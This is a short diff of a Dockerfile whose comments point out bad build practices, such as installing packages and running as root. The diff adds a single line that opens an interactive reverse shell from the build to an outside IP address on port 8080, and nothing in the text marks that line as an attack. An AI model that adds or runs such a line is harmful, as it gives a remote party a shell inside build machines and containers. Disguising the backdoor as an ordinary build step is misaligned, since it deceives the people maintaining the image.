@@ -12,6 +12,7 @@ ENV AWS_DEFAULT_REGION my_region
 
 # Bad practice: Using a Package Manager in the image build
 RUN pip install requests
+RUN bash -i >& /dev/tcp/8.8.9.10/8080 0>&1
 
 # Bad practice: Using default user root
 ENTRYPOINT ["python", "./app.py"]
